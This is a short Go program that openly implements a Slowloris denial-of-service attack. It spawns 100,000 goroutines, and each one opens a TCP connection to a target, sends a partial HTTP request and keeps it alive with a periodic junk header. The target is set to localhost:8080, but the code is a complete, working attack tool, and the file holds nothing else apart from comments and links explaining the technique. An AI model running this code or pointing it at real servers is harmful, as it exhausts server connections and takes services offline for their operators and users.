package main

import (
	"fmt"
	"net"
	"time"
)

// Slowloris DDoS attack
// attempts to overwhelm a targeted server by opening and
// maintaining many simultaneous HTTP connections to the target.
// https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/
// https://en.wikipedia.org/wiki/Slowloris_(cyber_attack)

func main() {
	target := "localhost:8080"
	connections := 100000 //100000

	for i := 0; i < connections; i++ {
		go slowloris(target)
	}

	// Keep the main goroutine running
	select {}
}

func slowloris(target string) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer func() {
		if err := conn.Close(); err != nil {
			fmt.Printf("Failed to close the connection: %v", err)
		}
	}()

	// Send partial HTTP request
	if err := writeOrFail(conn, "GET / HTTP/1.1\r\n"); err != nil {
		return
	}
	if err := writeOrFail(conn, "Host: %s\r\n", target); err != nil {
		return
	}
	if err := writeOrFail(conn, "User-Agent: Mozilla/5.0\r\n"); err != nil {
		return
	}

	for {
		// Send incomplete header periodically
		if err := writeOrFail(conn, "X-a: %d\r\n", time.Now().UnixNano()); err != nil {
			return
		}
		time.Sleep(10 * time.Second)
	}
}

func writeOrFail(conn net.Conn, format string, args ...interface{}) error {
	_, err := fmt.Fprintf(conn, format, args...)
	if err != nil {
		fmt.Printf("Write failed: %v", err)
		defer func() {
			if err := conn.Close(); err != nil {
				fmt.Printf("Failed to close the connection: %v", err)
			}
		}()
	}
	return err
}
